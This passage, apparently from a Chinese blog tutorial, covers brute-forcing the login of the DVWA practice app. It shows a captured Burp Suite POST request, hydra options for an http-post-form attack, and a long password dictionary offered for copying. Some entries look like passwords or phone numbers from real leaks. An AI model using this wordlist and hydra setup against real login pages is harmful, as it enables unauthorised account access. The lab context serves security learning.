</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">POST</span> <span class="nn">/dvwa/login.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
</span></span><span class="line"><span class="cl"><span class="n">Host</span><span class="o">:</span> <span class="l">192.168.0.4</span>
</span></span><span class="line"><span class="cl"><span class="n">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (X11; Linux i586; rv:31.0) Gecko/20100101 Firefox/31.0</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Language</span><span class="o">:</span> <span class="l">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span>
</span></span><span class="line"><span class="cl"><span class="n">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
</span></span><span class="line"><span class="cl"><span class="n">Content-Length</span><span class="o">:</span> <span class="l">46</span>
</span></span><span class="line"><span class="cl"><span class="n">Connection</span><span class="o">:</span> <span class="l">close</span>
</span></span><span class="line"><span class="cl"><span class="n">Referer</span><span class="o">:</span> <span class="l">http://192.168.0.4/dvwa/login.php</span>
</span></span><span class="line"><span class="cl"><span class="n">Cookie</span><span class="o">:</span> <span class="l">security=high; PHPSESSID=091eeaf25f53c1c6c6dd230cd5add7be</span>
</span></span><span class="line"><span class="cl"><span class="n">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛…这么一大堆看着都头晕</p>
<p>诶嘿，其实这里你只需要保存这一部分就可以了</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">username=admin&amp;password=6666666666&amp;Login=Login
</span></span></code></pre></td></tr></table>
</div>
</div><p>嘛，上面这点还不够呢，还需要获取一段信息。</p>
<p>现在网页看起来像时间停止了一样一动不动的对不对？</p>
<p>那么我来解释一下burp这里三个按钮的意思</p>
<ul>
<li>Forward:放行，让网页继续执行抓到的数据包</li>
<li>Drop:丢弃，将这个数据包扔了，网页就执行不了了</li>
</ul>
<p>现在，我们点击<code>Forward</code>，放行这个数据包</p>
<p>这时，网页下面弹出了一段字符串</p>
<p></p>
<p>码下来，一会儿要用到的</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">Login failed
</span></span></code></pre></td></tr></table>
</div>
</div><p>接下来把burpsuite关掉，浏览器代理关掉，这个不多说步骤了。</p>
<p>嗯…整个抓包的过程就完成了。然后就是进行<strong>爆破</strong>了</p>
<h4 id="爆破">爆破</h4>
<p>嘛…最精彩的部分来了</p>
<p>你知道<strong>hydra</strong>吗？如果不知道那么请出门左转用搜索引擎查一下。</p>
<p>我们要给hydra设置这么几个参数</p>
<ul>
<li>-l + 用户名 : 这个是设置需要破解的用户名，我们尝试admin</li>
<li>-P 密码字典 : 指定一个txt文件，里面都是依次猜测需要的密码</li>
<li>-V : 显示详细过程</li>
<li>-n es : 尝试空口令登录</li>
<li>IP地址 : 也就是目标的地址咯，上面的<code>192.168.0.4</code></li>
<li>http-post-form : 指定爆破类型，后面还要加爆破的页面地址，这里是http的post页面 没有密码字典？我这里提供一个，你自己复制进一个txt文件里就可以了。</li>
</ul>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span><span class="lnt">103
</span><span class="lnt">104
</span><span class="lnt">105
</span><span class="lnt">106
</span><span class="lnt">107
</span><span class="lnt">108
</span><span class="lnt">109
</span><span class="lnt">110
</span><span class="lnt">111
</span><span class="lnt">112
</span><span class="lnt">113
</span><span class="lnt">114
</span><span class="lnt">115
</span><span class="lnt">116
</span><span class="lnt">117
</span><span class="lnt">118
</span><span class="lnt">119
</span><span class="lnt">120
</span><span class="lnt">121
</span><span class="lnt">122
</span><span class="lnt">123
</span><span class="lnt">124
</span><span class="lnt">125
</span><span class="lnt">126
</span><span class="lnt">127
</span><span class="lnt">128
</span><span class="lnt">129
</span><span class="lnt">130
</span><span class="lnt">131
</span><span class="lnt">132
</span><span class="lnt">133
</span><span class="lnt">134
</span><span class="lnt">135
</span><span class="lnt">136
</span><span class="lnt">137
</span><span class="lnt">138
</span><span class="lnt">139
</span><span class="lnt">140
</span><span class="lnt">141
</span><span class="lnt">142
</span><span class="lnt">143
</span><span class="lnt">144
</span><span class="lnt">145
</span><span class="lnt">146
</span><span class="lnt">147
</span><span class="lnt">148
</span><span class="lnt">149
</span><span class="lnt">150
</span><span class="lnt">151
</span><span class="lnt">152
</span><span class="lnt">153
</span><span class="lnt">154
</span><span class="lnt">155
</span><span class="lnt">156
</span><span class="lnt">157
</span><span class="lnt">158
</span><span class="lnt">159
</span><span class="lnt">160
</span><span class="lnt">161
</span><span class="lnt">162
</span><span class="lnt">163
</span><span class="lnt">164
</span><span class="lnt">165
</span><span class="lnt">166
</span><span class="lnt">167
</span><span class="lnt">168
</span><span class="lnt">169
</span><span class="lnt">170
</span><span class="lnt">171
</span><span class="lnt">172
</span><span class="lnt">173
</span><span class="lnt">174
</span><span class="lnt">175
</span><span class="lnt">176
</span><span class="lnt">177
</span><span class="lnt">178
</span><span class="lnt">179
</span><span class="lnt">180
</span><span class="lnt">181
</span><span class="lnt">182
</span><span class="lnt">183
</span><span class="lnt">184
</span><span class="lnt">185
</span><span class="lnt">186
</span><span class="lnt">187
</span><span class="lnt">188
</span><span class="lnt">189
</span><span class="lnt">190
</span><span class="lnt">191
</span><span class="lnt">192
</span><span class="lnt">193
</span><span class="lnt">194
</span><span class="lnt">195
</span><span class="lnt">196
</span><span class="lnt">197
</span><span class="lnt">198
</span><span class="lnt">199
</span><span class="lnt">200
</span><span class="lnt">201
</span><span class="lnt">202
</span><span class="lnt">203
</span><span class="lnt">204
</span><span class="lnt">205
</span><span class="lnt">206
</span><span class="lnt">207
</span><span class="lnt">208
</span><span class="lnt">209
</span><span class="lnt">210
</span><span class="lnt">211
</span><span class="lnt">212
</span><span class="lnt">213
</span><span class="lnt">214
</span><span class="lnt">215
</span><span class="lnt">216
</span><span class="lnt">217
</span><span class="lnt">218
</span><span class="lnt">219
</span><span class="lnt">220
</span><span class="lnt">221
</span><span class="lnt">222
</span><span class="lnt">223
</span><span class="lnt">224
</span><span class="lnt">225
</span><span class="lnt">226
</span><span class="lnt">227
</span><span class="lnt">228
</span><span class="lnt">229
</span><span class="lnt">230
</span><span class="lnt">231
</span><span class="lnt">232
</span><span class="lnt">233
</span><span class="lnt">234
</span><span class="lnt">235
</span><span class="lnt">236
</span><span class="lnt">237
</span><span class="lnt">238
</span><span class="lnt">239
</span><span class="lnt">240
</span><span class="lnt">241
</span><span class="lnt">242
</span><span class="lnt">243
</span><span class="lnt">244
</span><span class="lnt">245
</span><span class="lnt">246
</span><span class="lnt">247
</span><span class="lnt">248
</span><span class="lnt">249
</span><span class="lnt">250
</span><span class="lnt">251
</span><span class="lnt">252
</span><span class="lnt">253
</span><span class="lnt">254
</span><span class="lnt">255
</span><span class="lnt">256
</span><span class="lnt">257
</span><span class="lnt">258
</span><span class="lnt">259
</span><span class="lnt">260
</span><span class="lnt">261
</span><span class="lnt">262
</span><span class="lnt">263
</span><span class="lnt">264
</span><span class="lnt">265
</span><span class="lnt">266
</span><span class="lnt">267
</span><span class="lnt">268
</span><span class="lnt">269
</span><span class="lnt">270
</span><span class="lnt">271
</span><span class="lnt">272
</span><span class="lnt">273
</span><span class="lnt">274
</span><span class="lnt">275
</span><span class="lnt">276
</span><span class="lnt">277
</span><span class="lnt">278
</span><span class="lnt">279
</span><span class="lnt">280
</span><span class="lnt">281
</span><span class="lnt">282
</span><span class="lnt">283
</span><span class="lnt">284
</span><span class="lnt">285
</span><span class="lnt">286
</span><span class="lnt">287
</span><span class="lnt">288
</span><span class="lnt">289
</span><span class="lnt">290
</span><span class="lnt">291
</span><span class="lnt">292
</span><span class="lnt">293
</span><span class="lnt">294
</span><span class="lnt">295
</span><span class="lnt">296
</span><span class="lnt">297
</span><span class="lnt">298
</span><span class="lnt">299
</span><span class="lnt">300
</span><span class="lnt">301
</span><span class="lnt">302
</span><span class="lnt">303
</span><span class="lnt">304
</span><span class="lnt">305
</span><span class="lnt">306
</span><span class="lnt">307
</span><span class="lnt">308
</span><span class="lnt">309
</span><span class="lnt">310
</span><span class="lnt">311
</span><span class="lnt">312
</span><span class="lnt">313
</span><span class="lnt">314
</span><span class="lnt">315
</span><span class="lnt">316
</span><span class="lnt">317
</span><span class="lnt">318
</span><span class="lnt">319
</span><span class="lnt">320
</span><span class="lnt">321
</span><span class="lnt">322
</span><span class="lnt">323
</span><span class="lnt">324
</span><span class="lnt">325
</span><span class="lnt">326
</span><span class="lnt">327
</span><span class="lnt">328
</span><span class="lnt">329
</span><span class="lnt">330
</span><span class="lnt">331
</span><span class="lnt">332
</span><span class="lnt">333
</span><span class="lnt">334
</span><span class="lnt">335
</span><span class="lnt">336
</span><span class="lnt">337
</span><span class="lnt">338
</span><span class="lnt">339
</span><span class="lnt">340
</span><span class="lnt">341
</span><span class="lnt">342
</span><span class="lnt">343
</span><span class="lnt">344
</span><span class="lnt">345
</span><span class="lnt">346
</span><span class="lnt">347
</span><span class="lnt">348
</span><span class="lnt">349
</span><span class="lnt">350
</span><span class="lnt">351
</span><span class="lnt">352
</span><span class="lnt">353
</span><span class="lnt">354
</span><span class="lnt">355
</span><span class="lnt">356
</span><span class="lnt">357
</span><span class="lnt">358
</span><span class="lnt">359
</span><span class="lnt">360
</span><span class="lnt">361
</span><span class="lnt">362
</span><span class="lnt">363
</span><span class="lnt">364
</span><span class="lnt">365
</span><span class="lnt">366
</span><span class="lnt">367
</span><span class="lnt">368
</span><span class="lnt">369
</span><span class="lnt">370
</span><span class="lnt">371
</span><span class="lnt">372
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-txt" data-lang="txt"><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">12345
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">Password
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">princess
</span></span><span class="line"><span class="cl">rockyou
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">admin888
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">test
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">5201314
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">woaini1314
</span></span><span class="line"><span class="cl">qq123456
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">0
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">7758521
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">a123123
</span></span><span class="line"><span class="cl">123456aa
</span></span><span class="line"><span class="cl">woaini520        
</span></span><span class="line"><span class="cl">woaini
</span></span><span class="line"><span class="cl">100200
</span></span><span class="line"><span class="cl">1314520
</span></span><span class="line"><span class="cl">woaini123
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">q123456
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456789a
</span></span><span class="line"><span class="cl">5211314
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">a123456789
</span></span><span class="line"><span class="cl">z123456
</span></span><span class="line"><span class="cl">asd123456
</span></span><span class="line"><span class="cl">a5201314
</span></span><span class="line"><span class="cl">aa123456
</span></span><span class="line"><span class="cl">zhang123
</span></span><span class="line"><span class="cl">aptx4869
</span></span><span class="line"><span class="cl">123123a
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">5201314a
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">aini1314
</span></span><span class="line"><span class="cl">31415926
</span></span><span class="line"><span class="cl">q1w2e3r4
</span></span><span class="line"><span class="cl">123456qq
</span></span><span class="line"><span class="cl">woaini521
</span></span><span class="line"><span class="cl">1234qwer
</span></span><span class="line"><span class="cl">a111111
</span></span><span class="line"><span class="cl">520520
</span></span><span class="line"><span class="cl">iloveyou
</span></span><span class="line"><span class="cl">abc123 
</span></span><span class="line"><span class="cl">110110
</span></span><span class="line"><span class="cl">111111a          
</span></span><span class="line"><span class="cl">123456abc        
</span></span><span class="line"><span class="cl">w123456
</span></span><span class="line"><span class="cl">7758258
</span></span><span class="line"><span class="cl">123qweasd
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">a000000
</span></span><span class="line"><span class="cl">qq123123
</span></span><span class="line"><span class="cl">zxc123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">abc123456
</span></span><span class="line"><span class="cl">123456q
</span></span><span class="line"><span class="cl">qq5201314
</span></span><span class="line"><span class="cl">12345678
</span></span><span class="line"><span class="cl">000000a          
</span></span><span class="line"><span class="cl">456852
</span></span><span class="line"><span class="cl">as123456
</span></span><span class="line"><span class="cl">1314521          
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">521521
</span></span><span class="line"><span class="cl">qazwsx123
</span></span><span class="line"><span class="cl">zxc123456
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">666666
</span></span><span class="line"><span class="cl">love1314
</span></span><span class="line"><span class="cl">QAZ123
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">aaaaaa
</span></span><span class="line"><span class="cl">a123321
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">11111111
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">5845201314
</span></span><span class="line"><span class="cl">s123456
</span></span><span class="line"><span class="cl">nihao123
</span></span><span class="line"><span class="cl">caonima123
</span></span><span class="line"><span class="cl">zxcvbnm123
</span></span><span class="line"><span class="cl">wang123
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">1A2B3C4D
</span></span><span class="line"><span class="cl">asdasd123
</span></span><span class="line"><span class="cl">584520
</span></span><span class="line"><span class="cl">753951
</span></span><span class="line"><span class="cl">147258
</span></span><span class="line"><span class="cl">1123581321
</span></span><span class="line"><span class="cl">110120
</span></span><span class="line"><span class="cl">qq1314520        
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">idc123!@#
</span></span><span class="line"><span class="cl">123
</span></span><span class="line"><span class="cl">aaa123!@#
</span></span><span class="line"><span class="cl">qq123.com
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">wantian##*(
</span></span><span class="line"><span class="cl">qwe123
</span></span><span class="line"><span class="cl">qwe1234
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">123qwer
</span></span><span class="line"><span class="cl">1qaz2wsx
</span></span><span class="line"><span class="cl">1qaz
</span></span><span class="line"><span class="cl">159753
</span></span><span class="line"><span class="cl">!Q@W#E
</span></span><span class="line"><span class="cl">159357
</span></span><span class="line"><span class="cl">147369
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">password
</span></span><span class="line"><span class="cl">aistar123&lt;&gt;!N
</span></span><span class="line"><span class="cl">321
</span></span><span class="line"><span class="cl">idcji2010
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">1q2w3e
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">336699
</span></span><span class="line"><span class="cl">abc123
</span></span><span class="line"><span class="cl">asd123
</span></span><span class="line"><span class="cl">123654
</span></span><span class="line"><span class="cl">1
</span></span><span class="line"><span class="cl">111111
</span></span><span class="line"><span class="cl">111
</span></span><span class="line"><span class="cl">111qqq...
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">953139.
</span></span><span class="line"><span class="cl">0258
</span></span><span class="line"><span class="cl">111qqq!!!
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">qqii
</span></span><span class="line"><span class="cl">tyinfo
</span></span><span class="line"><span class="cl">abcd36888
</span></span><span class="line"><span class="cl">rst_login
</span></span><span class="line"><span class="cl">OAOidc
</span></span><span class="line"><span class="cl">OAOidc123!@#
</span></span><span class="line"><span class="cl">OAOidc123
</span></span><span class="line"><span class="cl">esin888
</span></span><span class="line"><span class="cl">qwer
</span></span><span class="line"><span class="cl">power123
</span></span><span class="line"><span class="cl">power.liu
</span></span><span class="line"><span class="cl">power.yu
</span></span><span class="line"><span class="cl">dns99+588
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">7715123
</span></span><span class="line"><span class="cl">sdwer
</span></span><span class="line"><span class="cl">power.zhao
</span></span><span class="line"><span class="cl">sdwer123
</span></span><span class="line"><span class="cl">qwer1234
</span></span><span class="line"><span class="cl">esincs
</span></span><span class="line"><span class="cl">jspower123.0
</span></span><span class="line"><span class="cl">5656789
</span></span><span class="line"><span class="cl">2323456
</span></span><span class="line"><span class="cl">power.com
</span></span><span class="line"><span class="cl">power123.0
</span></span><span class="line"><span class="cl">power0.123
</span></span><span class="line"><span class="cl">jspower.com
</span></span><span class="line"><span class="cl">123123
</span></span><span class="line"><span class="cl">hlwj0519-1205.jf
</span></span><span class="line"><span class="cl">123321
</span></span><span class="line"><span class="cl">zaxscdvf
</span></span><span class="line"><span class="cl">..0
</span></span><span class="line"><span class="cl">!@#$QWER
</span></span><span class="line"><span class="cl">95313
</span></span><span class="line"><span class="cl">1231321
</span></span><span class="line"><span class="cl">321123
</span></span><span class="line"><span class="cl">vipnew
</span></span><span class="line"><span class="cl">idc0514
</span></span><span class="line"><span class="cl">1235698
</span></span><span class="line"><span class="cl">235689
</span></span><span class="line"><span class="cl">326598
</span></span><span class="line"><span class="cl">112233
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">qqqqqq
</span></span><span class="line"><span class="cl">idc11
</span></span><span class="line"><span class="cl">21vianet
</span></span><span class="line"><span class="cl">#@!ewq
</span></span><span class="line"><span class="cl">1010
</span></span><span class="line"><span class="cl">111qqq
</span></span><span class="line"><span class="cl">1234%^&amp;*
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">123456
</span></span><span class="line"><span class="cl">4867086
</span></span><span class="line"><span class="cl">1234567
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">123456!@#
</span></span><span class="line"><span class="cl">10000
</span></span><span class="line"><span class="cl">794613
</span></span><span class="line"><span class="cl">784512
</span></span><span class="line"><span class="cl">895623
</span></span><span class="line"><span class="cl">789456
</span></span><span class="line"><span class="cl">456123
</span></span><span class="line"><span class="cl">654321
</span></span><span class="line"><span class="cl">123!@#
</span></span><span class="line"><span class="cl">1234!@#$
</span></span><span class="line"><span class="cl">11185
</span></span><span class="line"><span class="cl">12345!@#$%
</span></span><span class="line"><span class="cl">qwe123!@#
</span></span><span class="line"><span class="cl">!@#123
</span></span><span class="line"><span class="cl">!@#321
</span></span><span class="line"><span class="cl">123#@!
</span></span><span class="line"><span class="cl">19861212
</span></span><span class="line"><span class="cl">19831212
</span></span><span class="line"><span class="cl">19841020
</span></span><span class="line"><span class="cl">#@!123
</span></span><span class="line"><span class="cl">#@!321
</span></span><span class="line"><span class="cl">idcidc
</span></span><span class="line"><span class="cl">12345^&amp;*()
</span></span><span class="line"><span class="cl">!@#$%^&amp;*()
</span></span><span class="line"><span class="cl">)(*&amp;^%$#@!
</span></span><span class="line"><span class="cl">0987654321
</span></span><span class="line"><span class="cl">tyidc
</span></span><span class="line"><span class="cl">1122
</span></span><span class="line"><span class="cl">111222
</span></span><span class="line"><span class="cl">idc123
</span></span><span class="line"><span class="cl">idcidcok
</span></span><span class="line"><span class="cl">idcuser
</span></span><span class="line"><span class="cl">abcd1234
</span></span><span class="line"><span class="cl">1234abcd
</span></span><span class="line"><span class="cl">caonima
</span></span><span class="line"><span class="cl">1q2w3e4r
</span></span><span class="line"><span class="cl">888888
</span></span><span class="line"><span class="cl">admin!@#
</span></span><span class="line"><span class="cl">abc!@#
</span></span><span class="line"><span class="cl">!Q@W#E$R%T
</span></span><span class="line"><span class="cl">idc2010
</span></span><span class="line"><span class="cl">1236
</span></span><span class="line"><span class="cl">1q2w3e4r5t
</span></span><span class="line"><span class="cl">qqaazz
</span></span><span class="line"><span class="cl">asdasd
</span></span><span class="line"><span class="cl">admin
</span></span><span class="line"><span class="cl">admin1
</span></span><span class="line"><span class="cl">admin123
</span></span><span class="line"><span class="cl">aaa111
</span></span><span class="line"><span class="cl">111aaa
</span></span><span class="line"><span class="cl">123aaa
</span></span><span class="line"><span class="cl">lh222
</span></span><span class="line"><span class="cl">lhidc
</span></span><span class="line"><span class="cl">123a
</span></span><span class="line"><span class="cl">a123
</span></span><span class="line"><span class="cl">123456a
</span></span><span class="line"><span class="cl">a123456
</span></span><span class="line"><span class="cl">aaa123
</span></span><span class="line"><span class="cl">qazwsx
</span></span><span class="line"><span class="cl">qazxsw
</span></span><span class="line"><span class="cl">0123
</span></span><span class="line"><span class="cl">123112233
</span></span><span class="line"><span class="cl">123111
</span></span><span class="line"><span class="cl">www.7x24.cn
</span></span><span class="line"><span class="cl">shisp.net
</span></span><span class="line"><span class="cl">123000
</span></span><span class="line"><span class="cl">idc0123
</span></span><span class="line"><span class="cl">1230..
</span></span><span class="line"><span class="cl">123456789
</span></span><span class="line"><span class="cl">123456qwe
</span></span><span class="line"><span class="cl">123qwe
</span></span><span class="line"><span class="cl">12345qwert
</span></span><span class="line"><span class="cl">zxcvbnm
</span></span><span class="line"><span class="cl">qwerty
</span></span><span class="line"><span class="cl">qweqwe
</span></span><span class="line"><span class="cl">q1w2e3
</span></span><span class="line"><span class="cl">123ewq
</span></span><span class="line"><span class="cl">qwe321
</span></span><span class="line"><span class="cl">1qazxsw2
</span></span><span class="line"><span class="cl">12qwaszx
</span></span><span class="line"><span class="cl">1234rewq
</span></span><span class="line"><span class="cl">123456.com
</span></span><span class="line"><span class="cl">lituobestsanmao
</span></span><span class="line"><span class="cl">!@#19841010
</span></span><span class="line"><span class="cl">msfadmin
</span></span><span class="line"><span class="cl">19885510
</span></span><span class="line"><span class="cl">xyidc_2006
</span></span><span class="line"><span class="cl">95217189
</span></span><span class="line"><span class="cl">95217
</span></span><span class="line"><span class="cl">chinayixun
</span></span><span class="line"><span class="cl">huachen1258zz
</span></span><span class="line"><span class="cl">sanhe123
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">3H8IDC72sanhe000
</span></span><span class="line"><span class="cl">xiaoyili
</span></span><span class="line"><span class="cl">sanhe000~!@#  
</span></span><span class="line"><span class="cl">3H8IDC!!#
</span></span><span class="line"><span class="cl">ccfeng66131421  
</span></span><span class="line"><span class="cl">!@#59560955
</span></span><span class="line"><span class="cl">tkggja850518`1
</span></span><span class="line"><span class="cl">zhengui
</span></span><span class="line"><span class="cl">anada325!@#
</span></span><span class="line"><span class="cl">www.txwscx.comsritgyxf2sxy19831122zx
</span></span><span class="line"><span class="cl">ZHONGGUO$#@!999@
</span></span><span class="line"><span class="cl">admin13906271234
</span></span><span class="line"><span class="cl">395835961
</span></span><span class="line"><span class="cl">senlinyan
</span></span><span class="line"><span class="cl">3203672
</span></span><span class="line"><span class="cl">9527999!!!
</span></span><span class="line"><span class="cl">P@ssw0rd
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">idc9aewr42
</span></span><span class="line"><span class="cl">idc0.1
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">qsx6059410172.
</span></span><span class="line"><span class="cl">idc0001
</span></span><span class="line"><span class="cl">idc800888
</span></span><span class="line"><span class="cl">idc46121
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">882627.8
</span></span><span class="line"><span class="cl">luofei520!@#123
</span></span><span class="line"><span class="cl">852799!!!
</span></span><span class="line"><span class="cl">idc0123.0
</span></span><span class="line"><span class="cl">513tyml.com
</span></span><span class="line"><span class="cl">abc123!@#
</span></span><span class="line"><span class="cl">1q2w3e,./? &gt;&lt;
</span></span><span class="line"><span class="cl">6504710shuazuan
</span></span><span class="line"><span class="cl">123.789+
</span></span><span class="line"><span class="cl">123asdasd
</span></span><span class="line"><span class="cl">752883855.
</span></span><span class="line"><span class="cl">senlinyan$
</span></span><span class="line"><span class="cl">admin001
</span></span><span class="line"><span class="cl">6695zx
</span></span><span class="line"><span class="cl">scictd9821622
</span></span><span class="line"><span class="cl">365obsserver!
</span></span><span class="line"><span class="cl">ranglm123456
</span></span><span class="line"><span class="cl">13920225257
</span></span><span class="line"><span class="cl">idc925111
</span></span><span class="line"><span class="cl">1qaz@wsx#edc
</span></span><span class="line"><span class="cl">.......199
</span></span><span class="line"><span class="cl">xu15817079919
</span></span><span class="line"><span class="cl">yanjin0429
</span></span><span class="line"><span class="cl">zhangznw
</span></span><span class="line"><span class="cl">13527380230
</span></span><span class="line"><span class="cl">idc0.01
</span></span><span class="line"><span class="cl">idc123&amp;123
</span></span><span class="line"><span class="cl">662766
</span></span><span class="line"><span class="cl">122.224
</span></span><span class="line"><span class="cl">huaiyukeji115
</span></span><span class="line"><span class="cl">.......199@
</span></span><span class="line"><span class="cl">liuzhangzi1988
</span></span><span class="line"><span class="cl">123456!@#$%^
